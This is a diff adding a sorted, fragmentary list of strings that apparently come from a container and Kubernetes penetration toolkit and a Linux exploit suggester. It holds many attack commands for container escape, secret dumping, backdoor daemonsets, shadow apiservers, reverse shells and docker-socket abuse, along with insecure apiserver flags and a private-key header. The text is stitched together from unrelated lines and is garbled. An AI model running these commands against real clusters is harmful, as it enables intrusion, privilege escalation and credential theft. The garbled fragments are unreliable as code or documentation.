@@ -1,0 +1,146 @@
+ -- /cdk-fabric evaluate
+ -- /cdk-fabric kcurl
+ -- /cdk-fabric kcurl anonymous get https://172.21.0.1:443/api/v1/nodes
+ -- /cdk-fabric kcurl default get http://172.21.0.1:443/api/v1/nodes
+ -- /cdk-fabric kcurl default get https://172.21.0.1:443/api/v1/nodes
+ -- /cdk-fabric run istio-check
+ -- /cdk-fabric run k8s-backdoor-daemonset 1
+ -- /cdk-fabric run k8s-backdoor-daemonset anonymous ubuntu
+ -- /cdk-fabric run k8s-configmap-dump
+ -- /cdk-fabric run k8s-configmap-dump /tmp/jkdhahdjfka2
+ -- /cdk-fabric run k8s-configmap-dump auto
+ -- /cdk-fabric run k8s-secret-dump
+ -- /cdk-fabric run k8s-secret-dump auto
+ -- /cdk-fabric run k8s-shadow-apiserver anonymous
+ -- /cdk-fabric run k8s-shadow-apiserver default
+ -- curl 192.168.0.150:9443
+ -- {} {}'.format(
+ ----------
+ --allow-privileged=true
+ --anonymous-auth=true
+ --authorization-mode=AlwaysAllow
+ --checksec mode
+ --checksec mode is standalone mode and is not applicable when one of -k | -u | -p | --cvelist-file switches are set
+ --checksec mode: return 2 if there is no such switch in sysctl
+ --checksec)
+ --client-ca-file=/etc/kubernetes/pki/ca.crt
+ --cvelist-file mode
+ --cvelist-file mode is standalone mode and is not applicable when one of -k | -u | -p | --checksec switches are set
+ --cvelist-file mode skip kernel version comparision
+ --cvelist-file mode: check if CVE associated with the exploit is on the CVELIST_FILE
+ --cvelist-file)
+ --enable-bootstrap-token-auth=true
+ --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
+ --fetch-binaries option
+ --fetch-sources option
+ --full
+ --full                       Enable file scan during information gathering.
+ --full and --short are set
+ --full filter option
+ --help     Show this help msg.
+ --insecure-bind-address=0.0.0.0
+ --insecure-port=443
+ --kernel and --uname are set
+ --kernel set
+ --kernelspace-only)
+ --kernelspacy-only & --userspace-only filter options
+ --list
+ --list                            List all available exploits.
+ --net=host
+ --pkglist-file NOT provided: take all info from current machine
+ --pkglist-file provided: only consider userspace exploits against provided package listing
+ --rm -it --privileged ubuntu bash
+ --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash
+ --secure-port to 9444
+ --server=https://<node-hostname>:9444/ --token=<token> --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
+ --skip-more-checks)
+ --skip-pkg-versions)
+ --skip-pkg-versions) version checking if package with given name is installed
+ --uname or -p modes) or if user said so (--skip-more-checks)
+ --uname or -p set) or if user said so (--skip-more-checks)
+ --uname set
+ --uname | --kernel | --cvelist-file | --checksec set
+ --unix-socket /var/run/docker.sock http://127.0.0.1/info
+ --userspace-only)
+ --version  Show version.
+"
+" -- ""$ARGS"""
+" -- /cdk-fabric         kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{""apiVersion"":""v1"",""kind"":""Pod"",""metadata"":{""annotations"":{""kubectl.kubernetes.io/last-applied-configuration"":""{\""apiVersion\"":\""v1\"",\""kind\"":\""Pod\"",\""metadata\"":{\""annotations\"":{},\""name\"":\""cdxy-test-2021\"",\""namespace\"":\""default\""},\""spec\"":{\""containers\"":[{\""image\"":\""ubuntu:latest\"",\""name\"":\""container\""}]}}\n""},""name"":""cdxy-test-2021"",""namespace"":""default""},""spec"":{""containers"":[{""image"":""ubuntu:latest"",""name"":""container""}]}}'        "
+" -- curl 10.206.0.11:9443',  # curl shadow-apiserver"
+" --checksec                   - list security related features for your HW/kernel"""
+" --checksec are mutually exclusive. Aborting."""
+" --client"""
+" --cvelist-file <file>        - provide file with Linux kernel CVEs list"""
+" --cvelist-file are mutually exclusive. Aborting."""
+" --fetch-binaries        - automatically downloads binary for matched exploit if available"""
+" --fetch-sources         - automatically downloads source for matched exploit"""
+" --full                  - show full info about matched exploit"""
+" --full', white_list, black_list)"
+" --full',"
+" --full` and `./cdk run`.""))"
+" --header ""Authorization: Bearer xxx"" --cacert ca.crt"
+" --help                  - print this help"""
+" --insecure-port has been deprecated, This flag has no effect now and will be removed in v1.24."""
+" --kernel <version>      - provide kernel version"""
+" --kernelspace-only           - show only kernel vulnerabilities"""
+" --kubeconfig={} cp {} {}:{}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, CDK.BIN_PATH, K8S.TARGET_POD,"
+" --kubeconfig={} exec {} -- ls {}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, K8S.TARGET_POD,"
+" --kubeconfig={} exec {} -- {} {}'.format(DEV_PATH.KUBECTL_PATH, K8S.KUBE_CONFIG, K8S.TARGET_POD,"
+" --list',"
+" --net=host privilege."")"
+" --options $SHORTOPTS  --longoptions $LONGOPTS -- ""$@"")"
+" --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' command output"""
+" --quiet list '*' -F '$name:$version' | cut -d/ -f2- | awk '{print $1"":""$2}')"
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric """
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric --help"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric -v"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ifconfig"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric kcurl"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric nc"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe 1.1.1.1 22 10 1000"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe 1.1.1.1 22 50-999999 1000"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ps"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run ak-leakage"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check /var/run/docker.sock"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup \""touch /tmp/mount-cgroup-success\"""""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-disk"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-procfs"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run reverse-shell"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe 127.0.0.1"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe 192.168.1.1-^^10"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ucurl"""
+" --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric vi"""
+" --rm --net=host alpine:latest /bin/sh -c ""/cdk-fabric evaluate --full"""
+" --rm --net=host ubuntu /bin/bash -c ""/cdk_linux_amd64 cmd"""
+" --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric evaluate --full"""
+" --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric run --list"""
+" --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric run shim-pwn \""touch /tmp/shim-pwn-success\"""""
+" --rm --privileged=true ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup \""touch /tmp/mount-cgroup-success\"""""
+" --rm --privileged=true ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-disk"""
+" --rm -v /proc:/host_proc ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-procfs /host_proc \""touch /tmp/mount-procfs-success\"""""
+" --rm -v /tmp/ak-leakage:/tmp/ak-leakage ubuntu:latest /bin/sh -c ""/cdk-fabric run ak-leakage /tmp"""
+" --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check /var/run/docker.sock"""
+" --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"""
+" --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric ucurl get /var/run/docker.sock http://127.0.0.1/info \""\"""""
+" --rm {} {} /bin/sh -c \""{} {}\"""".format("
+" --security-opt apparmor=unconfined` using docker, make sure the user inside container is root."
+" --server=https://%s:9444 --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"", node)"
+" --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"", node, token)"
+" --short                 - show shorten info about matched exploit"""
+" --show-dos              - show also DoSes in results"""
+" --skip-more-checks           - do not perform additional checks (kernel config, sysctl) to determine if exploit is applicable"""
+" --skip-pkg-versions          - skip checking for exact userspace package version (helps to avoid false negatives)"""
+" --uname <string>        - provide 'uname -a' string"""
+" --userspace-only             - show only userspace vulnerabilities"""
+" --version               - print version of this script"""
+---"
+---- | ---- | ----"
+---------- upload CDK to ECS, ACK, Selfbuild-K8s ----------"
+---------- upload all done ----------"
+-----BEGIN RSA PRIVATE KEY-----"
